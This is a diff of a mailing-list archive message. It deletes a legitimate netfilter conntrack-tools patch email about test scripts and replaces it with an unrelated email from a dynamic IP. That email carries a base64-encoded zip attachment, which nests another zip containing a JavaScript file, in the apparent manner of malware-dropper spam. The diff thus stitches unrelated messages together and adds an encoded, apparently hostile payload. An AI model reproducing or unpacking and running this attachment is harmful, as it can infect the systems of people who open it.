@@ -1,92 +1,72 @@
-From: Arturo Borrero Gonzalez <arturo@netfilter.org>
-Subject: [conntrack-tools PATCH] tests: don't fail on modprobe since the
- driver might be built-in
-Date: Tue, 15 Aug 2017 14:54:18 +0200
-Message-ID: <150280165807.21062.1101236218834054083.stgit@nfdev2.cica.es>
+From: <simon.a.t.hardy@gmail.com>
+Subject: (unknown)
+Date: Tue, 15 Aug 2017 17:30:16 -0000
+Message-ID: <150281821687.19169.10631746502405778868@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 7bit
-To: netfilter-devel@vger.kernel.org
+Content-Type: application/zip; name="459394949582.zip"
+Content-Transfer-Encoding: base64
+To: <netfilter-devel@vger.kernel.org>
 Return-path: <netfilter-devel-owner@vger.kernel.org>
-Received: from smtp3.cica.es ([150.214.5.190]:36820 "EHLO smtp.cica.es"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1752516AbdHOMy1 (ORCPT <rfc822;netfilter-devel@vger.kernel.org>);
-        Tue, 15 Aug 2017 08:54:27 -0400
-Received: from localhost (unknown [127.0.0.1])
-        by smtp.cica.es (Postfix) with ESMTP id D6D8151F42B
-        for <netfilter-devel@vger.kernel.org>; Tue, 15 Aug 2017 12:54:24 +0000 (UTC)
-Received: from smtp.cica.es ([127.0.0.1])
-        by localhost (mail.cica.es [127.0.0.1]) (amavisd-new, port 10024)
-        with ESMTP id hLy2AXlCVZHJ for <netfilter-devel@vger.kernel.org>;
-        Tue, 15 Aug 2017 14:54:19 +0200 (CEST)
-Received: from nfdev2.cica.es (nfdev2.cica.es [IPv6:2a00:9ac0:c1ca:31::221])
-        (Authenticated sender: servers@cica.es)
-        by smtp.cica.es (Postfix) with ESMTP id 5FDA351F429
-        for <netfilter-devel@vger.kernel.org>; Tue, 15 Aug 2017 14:54:19 +0200 (CEST)
+Received: from 36-236-186-31.dynamic-ip.hinet.net ([36.236.186.31]:42940 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1753483AbdHORaV (ORCPT <rfc822;netfilter-devel@vger.kernel.org>);
+        Tue, 15 Aug 2017 13:30:21 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: netfilter-devel-owner@vger.kernel.org
 List-ID: <netfilter-devel.vger.kernel.org>
 
-From: Steve Langasek <steve.langasek@ubuntu.com>
-
-Any of these nf drivers could be built-ins instead of modules; don't cause
-the testsuite to fail on modprobe, instead let it proceed and succeed/fail
-later based on actual test results.
-
-Ideally we would check up front if the driver is loaded rather than trying
-to modprobe and ignoring failures, but there doesn't seem to be a reliable
-place to check this in the kernel filesystem.
-
-Signed-off-by: Steve Langasek <steve.langasek@ubuntu.com>
-Signed-off-by: Arturo Borrero Gonzalez <arturo@netfilter.org>
----
- tests/conntrack/run-test.sh |   14 ++++++++------
- tests/nfct/run-test.sh      |   14 ++++++++------
- 2 files changed, 16 insertions(+), 12 deletions(-)
-
-diff --git a/tests/conntrack/run-test.sh b/tests/conntrack/run-test.sh
-index 1403e2c..1c1f8e4 100644
---- a/tests/conntrack/run-test.sh
-+++ b/tests/conntrack/run-test.sh
-@@ -10,10 +10,12 @@ gcc test-conntrack.c -o test
- #
- # XXX: module auto-load not support by nfnetlink_cttimeout yet :-(
- #
--modprobe nf_conntrack_ipv4
--modprobe nf_conntrack_ipv6
--modprobe nf_conntrack_proto_udplite
--modprobe nf_conntrack_proto_sctp
--modprobe nf_conntrack_proto_dccp
--modprobe nf_conntrack_proto_gre
-+# any or all of these might be built-ins rather than modules, so don't error
-+# out on failure from modprobe
-+modprobe nf_conntrack_ipv4 || true
-+modprobe nf_conntrack_ipv6 || true
-+modprobe nf_conntrack_proto_udplite || true
-+modprobe nf_conntrack_proto_sctp || true
-+modprobe nf_conntrack_proto_dccp || true
-+modprobe nf_conntrack_proto_gre || true
- ./test testcases
-diff --git a/tests/nfct/run-test.sh b/tests/nfct/run-test.sh
-index 851ee75..f5f220b 100644
---- a/tests/nfct/run-test.sh
-+++ b/tests/nfct/run-test.sh
-@@ -11,10 +11,12 @@ gcc test.c -o test
- #
- # XXX: module auto-load not support by nfnetlink_cttimeout yet :-(
- #
--modprobe nf_conntrack_ipv4
--modprobe nf_conntrack_ipv6
--modprobe nf_conntrack_proto_udplite
--modprobe nf_conntrack_proto_sctp
--modprobe nf_conntrack_proto_dccp
--modprobe nf_conntrack_proto_gre
-+# any or all of these might be built-ins rather than modules, so don't error
-+# out on failure from modprobe
-+modprobe nf_conntrack_ipv4 || true
-+modprobe nf_conntrack_ipv6 || true
-+modprobe nf_conntrack_proto_udplite || true
-+modprobe nf_conntrack_proto_sctp || true
-+modprobe nf_conntrack_proto_dccp || true
-+modprobe nf_conntrack_proto_gre || true
- ./test timeout
-
+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
+BgAAAAABAAEAWwAAAG8LAAAAAA==
